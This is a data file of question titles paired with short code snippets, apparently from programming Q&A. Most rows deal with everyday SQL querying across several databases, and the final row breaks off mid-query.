37480,21624,SQL detect elements in OR clause,"select *
from (
  SELECT col1, col2, 
         (cond1 AND cond2 AND cond3) as c1, 
         cond4 c2
  FROM table
) t
WHERE c1 OR c2
"
11437,4016,Dynamic where clause with set number of columns,"SELECT *
FROM Table
WHERE ISNULL(@Param1,Field1)=Field1
AND ISNULL(@Param2,Field2)=Field2
AND ISNULL(@Param3,Field3)=Field3
AND ISNULL(@Param4,Field4)=Field4
AND ISNULL(@Param5,Field5)=Field5
"
24103,48550,CodeIgniter - return only one row?,"$query = $this->db->get();
$ret = $query->row();
return $ret->campaign_id;
"
17424,43313,ms access - 3 table join w/ complex JOIN condition on third table,"SELECT ab.*, c.* 
FROM 
(
    SELECT a.ID AS ID1, a.ShoeSize AS ShoeSize1, b.ID AS ID2 
    FROM tblOne a LEFT JOIN tblTwo b 
        ON a.ParentId = b.Id
) ab LEFT JOIN tblThree c 
    ON c.ParentId = ab.ID2 and c.ShoeSize = ab.ShoeSize1
"
32988,14541,SQL Join with Group By,"select cm._Descriptor,
       min(cu.customerid)
from CustomerMake cm
  join Customer cu on cuo.CustomerId  = cm.CustomerId and cu.StatusId = 1
group by cm._Descriptor
"
11532,62738,SQL: Add all data from related table to a column,"SELECT  Invoice_Products.invoiceId,
        Invoices.Date,
        GROUP_CONCAT(Invoice_Products.productId) AS productIds
  FROM Invoice_Products
  JOIN Invoices ON Invoice_Products.invoiceId = Invoices.ID
 GROUP BY invoiceId
;
"
7018,15311,maximum differenence between two column,"select [companyname] as [company name], [open], [close], [difference], [date]
from (
    select [companyname], [open], [close], 
        [open] - [close] as [difference], [date],
        row_number() over (partition by [companyname] 
                           order by [open] - [close] desc) rn
    from Table1
) x
where rn = 1
"
31538,36439,Calculating the peak capacity of hotels with Sql,"Select
  i.Hotel,
  Max(i.OccupiedBeds)
From (
  Select
    s.Hotel,
    d.DayID,
    Count(*) As OccupiedBeds
  From
    SampleData s
      Inner Join
    Days d
      -- might not need to +1 depending on business rules.
      -- I wouldn't count occupancy on the day I check out, if so get rid of it
      On d.DayID >= s.CheckIn And d.DayID < s.CheckOut + 1 
  Group By
    s.Hotel, 
    d.DayID
  ) i
Group By
  i.Hotel
"
23537,46644,how to create a string in DB2,"SET STR_BUFF = 'SELECT * FROM' || VAR_TABLE || ' WHERE NAME LIKE ''%abc%'';' 
"
14674,42439,Need two calculated field but based on different where clause,"SELECT
 employeename,
 avg(CASE WHEN TABLE.optyid IS NULL THEN leadamount END) AS [avglead],
 sum(CASE WHEN TABLE.optyid IS NOT NULL THEN quota END) AS [QUOTA]
FROM TABLE
GROUP BY employeename
"
20932,55993,SQL SUM aggragete issue," SELECT id
,title
,qty/(select sum(qty) from cars) 
FROM cars 
GROUP BY id
"
26668,38273,simpler way to parse using regex,"SQL> with tbl(str) as (
     select 'ABCD 3/1'   from dual union
     select 'ABCD 332/1' from dual union
     select 'ABCD A/1'   from dual union
     select 'ABCD EFS'   from dual
   )
   select regexp_replace(str, '.*\s(\d)/\d.*', '\1') digit_before_slash
   from tbl;

DIGIT_BEFORE_SLASH
-----------------------------------------------------------------------------
3
ABCD 332/1
ABCD A/1
ABCD EFS

SQL>
"
3379,18768,Node.js and MSSQL stored procedures,"var request = new sql.Request(connection);
    request.input('input_parameter', sql.Int, 10);
    request.output('output_parameter', sql.VarChar(50));
    request.execute('procedure_name', function(err, recordsets, returnValue) {
        // ... error checks

        console.dir(recordsets);
    });
"
2346,50686,How to get last 5 unique product IDs?,"select ProductID from
(select ProductID, max(OrderNo)
 from Orders
 group by ProductID
 order by 2 desc) sq
limit 5
"
31587,75344,SQL Distinct Sum,"SELECT
    e.FirstName + ' ' + e.LastName AS [Full Name], 
    p.ProductName, 
    SUM(od.Quantity) AS [Quantity]
FROM Employees e
INNER JOIN Orders o
    ON o.EmployeeID = e.EmployeeID
INNER JOIN [Order Details] od
    ON od.OrderID = o.OrderID
INNER JOIN Products p
    ON p.ProductID = od.ProductID
GROUP BY
    e.FirstName + ' ' + e.LastName,
    p.ProductName
"
18009,53693,Perl DBI one connection from different objects: problems,"sub DESTROY {
    my ($self) = @_;
    $self->{dbh}->disconnect;
}
"
8855,40973,working with stored dates and sysdates in SQL,"select * from inventory where inv_input_dt < sysdate - 30
"
2838,12804,How to use the SUM function on a specific table two times and then make a deduction,"SELECT  ITEM_ID, 
        SUM(CASE WHEN OCCASION = 1 THEN QTY ELSE 0 END)
        - SUM(CASE WHEN OCCASION = 2 THEN QTY ELSE 0 END)
FROM    TEMPTABLE
GROUP BY ITEM_ID
"
11818,29712,How to model this simple relationship in a database schema?,"Subject_Campus_Semester (subject_id, campus_id, semester_id)

Subject(subject_id, subject_name, ...)

Campus(campus_id, campus_name, ...)

Semester(semester_id, semester_name, ...)
"
15771,27014,How to SELECT all pairs of ID except when IDs are the same or the pair already exist (even in reverse order),"SELECT a.id first, b.id second
FROM myrelation a, myrelation b
WHERE a.id < b.id;
"
8658,23817,How to format given number in Oracle to specific pattern?,"SELECT CONCAT('P', LPAD(my_number, case when length(my_number) < 6 then 5 else length(my_number) end, '0')) FROM DUAL;
"
93,51725,Selecting from two tables into an XML,"SELECT Table2.Name,Table2.Description,lastMeasurement.MeasurementId 

FROM Table2 t2
    INNER JOIN
        (SELECT * FROM Table1
        INNER JOIN
        (SELECT MAX(DateTime) AS LastMeasurement, MeasurementId as LastMeasurementId
        FROM Table1 GROUP BY MeasurementId) as lastMeasurement
        ON (Table1.MeasurementId = lastMeasurement.LastMeasurementId) 
        AND (Table1.DateTime = lastMeasurement.LastMeasurement)) as hLastMeasurement
    ON Table2.Id = hLastMeasurement.Id
    ORDER BY Table2.Id ASC
"
2427,65053,how to declare multiple variables in one line in oracle plsql block,"set serveroutput on
DECLARE
  A integer :=10;B integer :=5;
BEGIN
  dbms_output.put_line(a ||':'|| b);
END;
/

anonymous block completed
10:5
"
26174,29706,SAS- Increment a numeric PK column that is auto increment within a do loop,"PROC SQL noprint:
select max(pkid) into :mpk from TableB;
quit;

data tableA;
set tableA;
pkid = _n_ + &mpk; /*_n_ is the row number*/
run;

PROC SQL noprint;
Insert into TableB(pkid, col1b, col2b, col3b)
       Select pkid, col1A, col1B, col1C
       From tableA ;
QUIT;
"
12206,65433,Left Join Query issue of displaying duplicate results,"SELECT p.person_id, p.person_name, p.instructor_role, IFNULL(lj.company_id, 0) as  company_id, lj.person_id, lj.course_name
FROM person as p
LEFT JOIN courses_by_instructors as lj
      ON (lj.person_id = p.person_id AND lj.company_id = 7 )
WHERE instructor_role = 1
GROUP BY p.person_id,lj.course_name
ORDER BY person_name
"
646,16071,"SQL If data not found in similar date, get last date","select t.date, t.item, t.amount,
       (select top(1) price
          from price
         where t.item=p.item and p.date <= t.date
      order by p.date desc) price
  from [transaction] t;
"
4108,26089,Finding files in subdirectories created after a certain date,"DATE=<<date>>
SEARCH_PATH=/images/
DATE=`echo $DATE|sed 's/-//g'`
DATE=$DATE""0000""
FILE=~/timecheck_${RANDOM}_$(date +""%Y%m%d%H%M"")
touch -t $DATE $FILE
find $SEARCH_PATH -newer $FILE 2>/dev/null|awk 'BEGIN{f=0}{if(f==1)printf(""\""%s\"", "",l);l=$0;f=1}END{printf(""\""%s\"""",l)}'
rm -f $FILE
"
26410,66140,Database Triggers: On Insert,"CREATE TRIGGER trg_Table1_INSERT
ON dbo.Table1 AFTER INSERT 
AS BEGIN
   INSERT INTO dbo.Table2(SerialNo, Name)
      SELECT SerialNo, Name
      FROM Inserted

   INSERT INTO dbo.Table3(SomeOtherCol)
      SELECT SomeOtherCol
      FROM Inserted
END
"
23680,49955,Numberpart of a string in specific range,"drop table #t
create table #t(id varchar(100))
insert into #t values('BE09 Mytest'),
('BE10 Mytest'),
('CE101 Mytest'),
('CE300 Mytest'),
('CE450595 Mytest')


select id,cast(substring(id,patindex('%[0-9]%',id),patindex('%[a-z0-9] [a-z]%',id)-1) as int) from #t where cast(substring(id,patindex('%[0-9]%',id),patindex('%[a-z0-9] [a-z]%',id)-1) as int) between 10 and 101
"
38347,42345,nth day to nth month in SQL Server,"WITH DT AS
(
  SELECT CAST('January 1, 2015' as datetime) as dStart,
         CAST('December 30, 2015' as datetime) as dFinish,
         31 as nDay,
         2 as nMonth
 ),
 T AS
 (
   SELECT DATEADD(DAY,nDay-1,
                      DATEADD(MONTH, DATEDIFF(MONTH, 0, DStart), 0)
                  ) as d,0 as MonthNumber 
   FROM DT
   UNION ALL
   SELECT DATEADD(DAY,nDay-1,
                      DATEADD(MONTH, DATEDIFF(MONTH, 0, DStart)
                                     +T.MonthNumber+nMonth,0)
                  )as d, T.MonthNumber+nMonth as MonthNumber
         FROM T,DT
         WHERE DATEADD(DAY,nDay-1,
                      DATEADD(MONTH, DATEDIFF(MONTH, 0, DStart)
                                     +T.MonthNumber+nMonth,0)
                  )<=DT.dFinish

 )
 SELECT d FROM T,DT WHERE DAY(d)=DT.nDay
"
16723,25756,Oracle SQL Count with join,"SELECT 
  lifnr,
  COUNT(DISTINCT (CASE WHEN e1.bsart = 'NB' THEN e1.ebeln ELSE NULL END)) Schedule_Orders,
  COUNT(CASE WHEN e1.bsart = 'NB' THEN e1.ebeln ELSE NULL END) Schedule_Order_Lines,
  COUNT(DISTINCT (CASE WHEN e1.bsart = 'ZNBS' THEN e1.ebeln ELSE NULL END)) Store_Orders,
  COUNT(CASE WHEN e1.bsart = 'ZNBS' THEN e1.ebeln ELSE NULL END) Store_Order_Lines,
  COUNT(DISTINCT (CASE WHEN e1.bsart = 'ZCSO' THEN e1.ebeln ELSE NULL END)) Third_Party,
  COUNT(CASE WHEN e1.bsart = 'ZCSO' THEN e1.ebeln ELSE NULL END) Third_Party_Lines,
  COUNT(DISTINCT (CASE WHEN e1.bsart NOT IN ('ZCSO', 'NB', 'ZNBS' ) THEN e1.ebeln ELSE NULL END)) Other_Orders,
  COUNT(CASE WHEN e1.bsart NOT IN ('ZCSO', 'NB', 'ZNBS') THEN e1.ebeln ELSE NULL END) Other_Order_Lines,
  COUNT(DISTINCT(e1.ebeln)) Total_Orders,
  COUNT(e1.ebeln) Total_Order_Lines
FROM saprpe.ekko e1
LEFT JOIN saprpe.ekpo p1
ON e1.ebeln = p1.ebeln
WHERE e1.aedat BETWEEN '20130701' AND '20140701'
GROUP BY lifnr
"
28058,61201,SQLite COUNT and selecting from multiple tables,"select owner.name, food.name, count(duck.id)
from duck, food, owner
where duck.id == food.duckID
and duck.ownerID == owner.id
group by owner.name, food.name;
"
38949,73036,Don't display dynamic query in result,"-- Create query
declare @query nvarchar(max)
set @query = 'select ' + @entityname + 'id from ' + @entityname + ' where ' + @entityname + 'id = ' + cast(@entityid as nvarchar(100))

-- Insert into to temp table - no new result set displayed!
declare @tbl table (EntityID int not null primary key)
insert into @tbl
    exec (@query)

-- Retrieve variable from temporary table
declare @count int
select @count = count(*) from @tbl
"
23594,58419,SQL ROW_NUMBER() issue with paging,"SELECT RowConstrainedResult.*
FROM (
     SELECT ROW_NUMBER() OVER (ORDER BY f.ItemCreatedOnDate DESC) AS RowNum, 
            f.*
     FROM (
          SELECT t.ItemIdId,
                 t.ItemTypeId,
                 t.CreatedOnDate as ItemCreatedOnDate,
                 t.CityId as CityId
          FROM dbo.Items AS t
          WHERE CityId = @CityId
          ) AS f
     ) AS RowConstrainedResult
WHERE RowNum >= @From AND 
      RowNum < @From + 50
"
31607,31706,MySQL group having question,"SELECT SUM(CASE 
             WHEN FROM_UNIXTIME(u.registration_date, '%Y-%m-%d') = CURDATE() THEN 1 
             ELSE 0 
           END) AS numToday,
       SUM(CASE 
             WHEN FROM_UNIXTIME(u.registration_date, '%Y-%m-%d') BETWEEN DATE_ADD(CURDATE(), INTERVAL 0-WEEKDAY(CURDATE()) DAY)AND CURDATE() THEN 1 
             ELSE 0 
           END) AS numThisWeek,
       SUM(CASE 
             WHEN FROM_UNIXTIME(u.registration_date, '%Y-%m') = DATE_FORMAT(NOW(), '%Y-%m') THEN 1 
             ELSE 0 
           END) AS numThisMonth
  FROM USERS u
"
9694,8773,How to get the Selected rows based on Multiple Column Values,"Select T2.Name,Convert(Bit,T2.Value) from  [Table1] T1
join [Table2] T2 with(nolock) on T1.Id = T2. Id
where T1.SID= 'DDXRS' AND T2.Name IN ('Base', 'Type', 'Serialized')
"
8576,40930,Select each record with first NULL Value after non-NULL value in record set,"select t.*
from (select t.*, lag(RepairDate) over (order by InspectionDate) as prevRepairDate
      from table t
     ) t
where prevRepairDate is not null and RepairDate is NULL;
"
39905,70517,Optimizing basic SELECT query with multiple NOT IN values,"SELECT id 
FROM table T1 
LEFT JOIN tblFilter T2
       ON T2.col0 = T2.col0
WHERE T2.col0 IS NULL
"
35030,59459,"How do I update if exists, insert if not (AKA ""upsert"" or ""merge"") in MySQL?","INSERT INTO `usage`
(`thing_id`, `times_used`, `first_time_used`)
VALUES
(4815162342, 1, NOW())
ON DUPLICATE KEY UPDATE
`times_used` = `times_used` + 1
"
13843,24711,Importing numbers with leading zeros from excel into SQL Server Management Studio,"=TEXT(P2,""0000"")
"
31833,41377,Laravel 4 distant Eloquent relations,"CorporateUsers::with('user.groups', 'corporations')->get();
"
24865,65292,PL/SQL Number rows with same ID,"select trn, date, product, 
       dense_rank() over (order by trn) as rn
from the_table;
"
14928,41166,MySQL: SELECT value and a minimum value on certain conditions in the same row,"SELECT p.id, p.pa, p.da, p.price, minp.price min_price
FROM prices p
JOIN (SELECT pa, da, min(price) price from prices group by pa, da) minp
ON minp.pa = p.pa and minp.da = p.da
WHERE p.id = 2
"
26165,65957,time of data.table join,"Rprof()
dtb[ssd_dtb]  # reduce size so that this takes 30 seconds or something manageable
Rprof(NULL)
summaryRprof()

Rprof()
dtb[ssd_dtb,mult=""first""]  # should be faster than above if my guess is right
Rprof(NULL)
summaryRprof()
"
6957,32597,How to ensure non-null duplicate values are not inserted in SQL Server 2005,"create unique index unq_history_rowid on history(rowid) where col is not null;
"
11489,19420,Showing only actual column data in SQL*Plus,"select A || ';' || B || ';' || C || ';' || D
from T
where ...
"
30601,43619,primary table joined to foreign table - select only one record from foreign table,"select d.*, dc.*
from deals d cross apply
     (select top 1 dc.*
      from deals_country dc
      where d.deal_id = dc.deal_id
     ) dc
order by d.deal_id;
"
13402,75136,SQL Query Statement Structure,";WITH CTE AS
(
    SELECT  *,
            RN = ROW_NUMBER() OVER(PARTITION BY CustomerIDNumber ORDER BY OrderItemID)
    FROM dbo.Orders
    WHERE OrderProcessed = 'False'
)
SELECT CustomerIDNumber, OrderProcessed
FROM CTE
WHERE RN = 1
ORDER BY OrderItemID
"
4508,20730,MySQL JOIN when inserting data,"INSERT INTO images
(name, uploaded, views, server_id)
SELECT 'imagename', CURTIME(), 0, id
FROM servers
WHERE name = 'servername'
"
14703,14620,MySQL matching partial strings with LIKE,"SELECT 
    * 
FROM 
    area_postcodes
WHERE
    'dl5 8tb' LIKE CONCAT(postcode_start, '%');
"
21164,65701,"Write a query to show the assessment code, name and no of version which have more than 1 versions","select a.name, a.code, max(av.ver_no) ver_no_max
from assessments a, assessment_vers av
where a.code = av.ass_code
group by a.name, a.code
having max(av.ver_no) > 1
order by a.code
"
29421,62612,COUNT( ) on multiple columns each having a condition,"select 
name,
sum(Present = 1) Presentcount,
sum(Absent = 1) Absentcount,
sum(Leaves= 1) Leavescount
from Attendance
group by name
"
26968,46539,Select Statement If Condition is Wrong in Sql,"SELECT CASE WHEN TRGT.div_brand IN ('Other', 'HPC1', 'HPC2') THEN NULL ELSE BRNDNAME.BRAND END AS BRAND 
 FROM sas_provBrand_targets TRGT

LEFT/INNER>?? JOIN
(SELECT DISTINCT BRAND, REP_BRAND, category, rep_category, 
  sub_category, SUB_CATEGORY_DESCRIPTION 
  FROM masterdata.dbo.inventory_item
  WHERE 
 ) BRNDNAME ON sub_category = TRGT.div_brand
"
5096,33263,Using timestamp column value in TIMEDIFF function,"SELECT TIMEDIFF (NOW(), my_col)
FROM   my_table
"
37826,65030,Maintaining a foreign key relationship when inserting into tables with autoincrementing Id's,"BEGIN TRAN

INSERT Defect ()
VALUES (...)

INSERT DefectData (DefectID, AdditionalNotes, ...)
VALUES (SCOPE_IDENTITY(), @AdditionalNotes, ...)

COMMIT TRAN
"
2849,58645,Simple tag searching with Sphinx,"sql_joined_field = tags from query; tag.assoc.document_id, \
                   tag_content from tags join tag_assoc on \
                   tags.id=tar_assoc.tag_id order by tag.assoc.document_id asc
"
24918,71465,How to always return subquery result?,"select ifnull(sum(lp.amount),0)-
(select (sum(l.amount_sum)-sum(lr.reward)) as total
from logs l
join logs_rewards lr on l.id = lr.related_log_id
where l.agent_id = '1')
as balance
from agents a
left join logs_payments lp on lp.agent_id = a.id
where a.id = '1'
"
8605,32945,SQL SERVER PIVOT TABLE One Row,"DECLARE @sql1 VARCHAR(4000) = ''
DECLARE @sql2 VARCHAR(4000) = ''
DECLARE @sql3 VARCHAR(4000) = ''

SELECT @sql1 =
'SELECT
      Pay
    , Staff
'
SELECT @sql2 = @sql2 +
'   , MAX(CASE WHEN RN = ' + CONVERT(VARCHAR(4), RN) + ' THEN Amount END) AS [Amount' + CONVERT(VARCHAR(4), RN) + ']' + CHAR(10) +
'   , MAX(CASE WHEN RN = ' + CONVERT(VARCHAR(4), RN) + ' THEN Tax END) AS [Tax' + CONVERT(VARCHAR(4), RN) + ']' + CHAR(10)
FROM(
    SELECT DISTINCT ROW_NUMBER() OVER(ORDER BY (SELECT NULL)) AS RN
    FROM YourTable
)t

SELECT @sql3 =
'FROM(
    SELECT *, RN=ROW_NUMBER() OVER(ORDER BY (SELECT NULL))
    FROM YourTable
)t
GROUP BY Pay, Staff
ORDER BY Pay, Staff'

PRINT (@sql1 + @sql2 + @sql3)
EXEC (@sql1 + @sql2 + @sql3)
"
20060,2496,mysql relational question. Get results when M:N null,"SELECT username
    FROM user u
        INNER JOIN usergroup ug
            ON u.usergroup_usergroupid = ug.usergroupid 
        LEFT JOIN user_has_bar ub
            ON u.userid = ub.user_userid
    WHERE u.userage = 10
        AND u.location_locationid = 1
        AND ub.user_userid IS NULL
"
37910,33556,SQL - Impersonate SYSTEM_USER,"Select System_User
Go

Execute As Login = 'SomeOtherLogin'   
   Select System_User
Revert
Go

Select System_User
Go
"
1763,5784,How to automatically backup a ratio of a table based on one column?,"create table t1 (
id integer primary key,
val integer not null);

create table t2 (
id integer primary key,
val integer not null);

insert into t1 values (1,1000);
insert into t1 values (2,1000);
insert into t1 values (3,1000);
insert into t1 values (4,1000);
insert into t1 values (5,1000);
insert into t1 values (6,1000);
insert into t1 values (7,1000);
insert into t1 values (8,1000);
insert into t1 values (9,1000);
insert into t1 values (10,1000);
insert into t1 values (11,1000);

insert into t2
select id, val
from t1
where (val >= 1000) 
  and (rownum <= cast((0.2 * (select count(*) from t1)) as integer));
"
19851,31011,Last date with time of the month,"SQL> SELECT to_char((trunc(last_day(sysdate)) +1) - 60/86400,'DD-Mon-YYYY HH24:MI:SS') dt
  2  FROM dual;

DT
--------------------
29-Feb-2016 23:59:00

SQL>
"
6114,63725,trying to insert different result sets by using single insert statement by checking condition,"declare @DueDate Datetime
declare @EndDate Datetime

declare @PaidOption varchar(10)
set @PaidOption='Monthly'

set @DueDate='2011-03-15'
set @EndDate='2013-09-04'


if @PaidOption='Monthly' -- for monthly
Begin
set @DueDate=DATEADD(month,+1,@DueDate)
WHILE @DueDate<@EndDate
BEGIN  
--insert statement use @duedate for datetobepaid and other values are as you input
  set @DueDate=DATEADD(month,+1,@DueDate)

END
End
Else -- for yearly
Begin
set @DueDate=DATEADD(Year,+1,@DueDate)
WHILE @DueDate<@EndDate
BEGIN  
--insert statement use @duedate for datetobepaid and other values are as you input
  set @DueDate=DATEADD(year,+1,@DueDate)

END
End
"
6366,18716,"mySQL SUM and COUNT issue, some values on join get doubled","COUNT(DISTINCT p.IdPagamento)
"
5804,61844,MySQL count problem,"SELECT COUNT(*), prerequisite FROM course GROUP BY prerequisite;
"
26878,38259,Combining two T-SQL pivot queries in one,"SELECT
     CASE SQ.total_type
          WHEN 1 THEN 'total special'
          WHEN 2 THEN 'total expensive'
          ELSE 'total'
     END AS total_type,
     SUM(CASE WHEN MONTH(R.CreateDate) = 1 THEN 1 ELSE 0 END) AS January,
     SUM(CASE WHEN MONTH(R.CreateDate) = 2 THEN 1 ELSE 0 END) AS February,
     SUM(CASE WHEN MONTH(R.CreateDate) = 3 THEN 1 ELSE 0 END) AS March,
     ...
FROM
     dbo.Records R
INNER JOIN
     (
          SELECT 0 AS total_type UNION ALL   -- All
          SELECT 1 UNION ALL                 -- IsSpecial
          SELECT 2                           -- IsExpensive
     ) AS SQ ON
     (R.IsSpecial | (R.IsExpensive * 2)) & SQ.total_type = SQ.total_type
GROUP BY
     SQ.total_type
ORDER BY
     SQ.total_type DESC
"
38169,51335,Only show order when all the order detail are received,"SELECT OrderHeader.OrderID, OrderHeader.Name
FROM OrderHeader 
     INNER JOIN OrderDetail
     ON OrderHeader.OrderId = OrderDetail.OrderId
GROUP BY OrderHeader.OrderID, OrderHeader.Name
HAVING 
      Count(OrderDetail.OrderId )   = SUM(IiF (OrderDetail.StatusFK = 2 ,1,0) ) 
"
32134,671,"Get coordinates (row,column) of a table in a MySQL query","SELECT name, 
CASE COL
  WHEN 0 THEN COL_0
  WHEN 1 THEN Col_1
END as rowcol
FROM tbl1 as t1
INNER JOIN tbl2 as t2
ON t1.ROW = t2.ROW
"
26794,1544,SQL insert data into a brand new column fails,"ALTER TABLE TableA ADD NewColumnA VARBINARY(300)
GO
--rest of the query
UPDATE TableA
SET 
    NewColumnA=b.OldColumnB,
FROM 
    TableA a, TableB b
WHERE a.myID=b.myID
"
26282,28574,Get a single value where the latest date,"select salesprice from `table` t
where t.date = 
(
  select max(date) from `table` t2 where t2.itemid = t.itemid
)
and t.itemid = 1 -- change item id here;
"
28159,67945,oracle materialized view refresh time,"SQL> alter session set nls_date_format = 'yyyy-mm-dd :hh24:mi:ss';

Session changed.

SQL> select sysdate from dual;

SYSDATE
--------------------
2008-12-19 :12:18:28

SQL> select (round(sysdate) + 1/24) + 1  from dual;

(ROUND(SYSDATE)+1/24
--------------------
2008-12-21 :01:00:00
"
38975,69716,Mysql mass edit,"UPDATE wp_posts SET someField = REPLACE(someField,'term1','term2')
WHERE post_date < '2013-01-01'
"
5292,46634,SQL procedure which should shows total,"WITH CTE AS (
SELECT
    MAX(a.AgencyName) Name,
    COUNT(PickupID) as YearTotal,
    COUNT(PickupID)/(CASE WHEN YEAR(GETDATE()) = YEAR(PickupDate) THEN MONTH(GETDATE()) ELSE 12 END) as MoAvg,
    SUM(CASE WHEN DATEPART(month, PickupDate) = 1 THEN 1 ELSE 0 end) as Jan,
    SUM(CASE WHEN DATEPART(month, PickupDate) = 2 THEN 1 ELSE 0 end) as Feb,
    SUM(CASE WHEN DATEPART(month, PickupDate) = 3 THEN 1 ELSE 0 end) as Mar,
    SUM(CASE WHEN DATEPART(month, PickupDate) = 4 THEN 1 ELSE 0 end) as Apr, 
    SUM(CASE WHEN DATEPART(month, PickupDate) = 5 THEN 1 ELSE 0 end) as May,
    SUM(CASE WHEN DATEPART(month, PickupDate) = 6 THEN 1 ELSE 0 end) as Jun,
    SUM(CASE WHEN DATEPART(month, PickupDate) = 7 THEN 1 ELSE 0 end) as Jul,
    SUM(CASE WHEN DATEPART(month, PickupDate) = 8 THEN 1 ELSE 0 end) as Aug, 
    SUM(CASE WHEN DATEPART(month, PickupDate) = 9 THEN 1 ELSE 0 end) as Sep,
    SUM(CASE WHEN DATEPART(month, PickupDate) = 10 THEN 1 ELSE 0 end) as Oct,
    SUM(CASE WHEN DATEPART(month, PickupDate) = 11 THEN 1 ELSE 0 end) as Nov,
    SUM(CASE WHEN DATEPART(month, PickupDate) = 12 THEN 1 ELSE 0 end) as Dec 
FROM dbo.Pickup p 
    JOIN Agency a ON p.agencyid = a.agencyid
GROUP BY a.AgencyID, YEAR(PickupDate)
)
SELECT * FROM CTE
UNION
SELECT 'Total',
    SUM(YearTotal) YearTotal,
    SUM(MoAvg) MoAvg,
    SUM(Jan) Jan,
    SUM(Feb) Feb,
    ....
    SUM(Dec) Dec
FROM CTE
"
34749,8541,Apply where condition when I have multiple rows for each id (Single table or Join multiple ones),"select b.pid
from basic b
group by p.pid
having sum(case when (b.sid = 2) and (b.st >= 7) then 1 else 0 end) > 0 and
       sum(case when (b.wid = 9) and (b.wt >= 6) then 1 else 0 end) > 0;
"
26407,11901,Sql query for aggregation,"SELECT product,
       [year],
       CASE
         WHEN ( [month] ) IN( '01', '02', '03' ) THEN '1-3'
         WHEN ( [month] ) IN( '04', '05', '06' ) THEN '4-6'
         WHEN ( [month] ) IN( '07', '08', '09' ) THEN '7-9'
         WHEN ( [month] ) IN( '10', '11', '12' ) THEN '10-12'
       END [Month],
       Sum(Price)
FROM   tablename
GROUP  BY product,
          [year],
          CASE
            WHEN ( [month] ) IN( '01', '02', '03' ) THEN '1-3'
            WHEN ( [month] ) IN( '04', '05', '06' ) THEN '4-6'
            WHEN ( [month] ) IN( '07', '08', '09' ) THEN '7-9'
            WHEN ( [month] ) IN( '10', '11', '12' ) THEN '10-12'
          END 
"
20847,21839,Selecting many columns but not all on Oracle,"DROP TABLE dynamic_built_table;

CREATE TABLE dynamic_built_table
  (
    column1 VARCHAR2(1),
    column2 VARCHAR2(1),
    column3 VARCHAR2(1),
    column4 VARCHAR2(1),
    column5 VARCHAR2(1),
    column6 VARCHAR2(1)
  );

DECLARE
  l_sql VARCHAR2(5000);
BEGIN
  l_sql         := 'CREATE OR REPLACE VIEW DYNAMIC_COLUMN_VIEW AS SELECT ';
  FOR l_columns IN
  (SELECT column_name,
      column_id,
      MAX(column_id) over (partition BY table_name) max_column
    FROM user_tab_cols
    WHERE table_name = 'DYNAMIC_BUILT_TABLE'
    AND column_id    > 3
  )
  LOOP
    l_sql                  := l_sql||l_columns.column_name;
    IF l_columns.column_id != l_columns.max_column THEN
      l_sql                := l_sql||',';
    END IF;
  END LOOP;
  l_sql := l_sql||' from dynamic_built_table';
  EXECUTE immediate l_sql;
END;
/

SELECT * FROM DYNAMIC_COLUMN_VIEW;
"
37871,56857,SQL Server Null Logical XOR,"if (@a is null and @b is not null) or (@a is not null and @b is null)
"
39708,61191,"View Column length Changed,when created with case and replace","create view v_testing as
    select Postcode = CASE WHEN LEN(A.RealPostcode) = 0 THEN NULL
                           ELSE CAST(REPLACE(A.RealPostcode,' ','') AS VARCHAR(8))
                      END,
           A.RealPostcode
    from dbo.Table A;
"
5640,4622,Use a field or a whole new table?,"CUSTOMERS
  id int pk
  info char

CASES
  id int pk
  customerid int fk
  dateOpened datetime
  dateClosed datetime
  status int <- open, closed, final billed, etc.
  BillPeriod int <- here is where you determine how often to bill the client.
  BillStartDate datetime <- date that billings should start on.

BILLING
  billingid int pk
  caseid int fk
  userid int fk <- id of person who is charging to this case. i.e. the lawyer.
  invoicedetailid fk <- nullable, this will make it easier to determine if this particular item has been invoiced or not.
  amount money
  billdate datetime
  billingcode int fk <- associate with some type of billing code table so you know what this is: time, materials, etc.
  description char


INVOICES
  invoiceid int pk
  customerid int FK
  invoicedate datetime
  amount money <- sum of all invoice details
  status int <- paid, unpaid, collection, etc..
  discount money <- sum of all invoice details discounts
  invoicetotal <- usually amount - discount.

INVOICEDETAILS
  invoicedetailid int PK
  invoiceid int FK
  billingid int FK
  discount money <- amount of a discount, if any
"
16866,41637,Get the entire row of the maximum value of a column in every category,"SELECT * FROM ( 
   SELECT * FROM table ORDER BY date DESC
) as t
GROUP BY t.category;
"
15,7412,"postgresql sql statement: Can't get the desired latest/recent comments, need to display the distinct posts.title with the latest comments"," SELECT p.title, q.LatestCommentDate
     FROM (SELECT c.post_id, MAX(c.created_at) AS LatestCommentDate
               FROM comment c
               GROUP BY c.post_id) q
         INNER JOIN posts p
             ON q.post_id = p.id;
"
36915,6580,Type synonym in oracle,"CREATE OR REPLACE PACKAGE SUBTYPES_PKG IS
  SUBTYPE EMAIL IS VARCHAR2(120);
END;
"
21412,31924,SQl Query problem -," SELECT     BusinessUnit, ProductCode,  DateFrom, DateTo, Price FROM
 (SELECT    BusinessUnit, ProductCode,  DateFrom, DateTo, Price, 
 rank() over (PARTITION BY ProductCode ORDER BY DateFrom DESC) rank_num
 FROM  WMPriceDetail
 WHERE (DateFrom < 'Sep 01 2011') AND (DateTo > 'Sep 01 2011' OR DateTo = '') t 
 WHERE rank_num=1
 ORDER BY ProductCode
"
36646,1335,Combining two nested SELECT with DISTINCT?,"SELECT Kontonr , Name FROM Geldkonto
WHERE Kontonr in (SELECT DISTINCT Ursprungskonto FROM Beleg
WHERE YEAR ( Valuta ) = 2016)
"
6646,39736,execute immediate over database link,"set serveroutput on

create or replace synonym remote_dbms_sql for dbms_sql@core;

declare
  c  number;
  l_global_name  varchar2(200);
begin
  c := remote_dbms_sql.open_cursor();
  remote_dbms_sql.parse( c, 'select global_name from global_name', dbms_sql.native );
  remote_dbms_sql.define_column( c, 1, l_global_name, 200 );
  dbms_output.put_line( remote_dbms_sql.execute_and_fetch( c ) );
  remote_dbms_sql.column_value( c, 1, l_global_name );
  dbms_output.put_line( l_global_name );
  remote_dbms_sql.close_cursor( c );
end;
/
"
33862,74023,How to display last three rows of a database table in android?,"SELECT * FROM yourTable ORDER BY date DESC LIMIT 3
"
17437,27192,Difficult hierarchical query and join,"select * from  
(select * from Product_types t
 START WITH T.Parent = 20 
 CONNECT BY PRIOR t.Product_ID = t.PARENT) t_result
left join Products p on T_RESULT.Product_ID = P.Product_ID
AND P.Customer = 2;
"
34954,21597,Postgresql group month wise with missing values,"select
    g.month,
    count(m)
from generate_series(1, 12) as g(month)
    left outer join my_table as m on
        m.id_object = 1 and
        m.status = 1 and
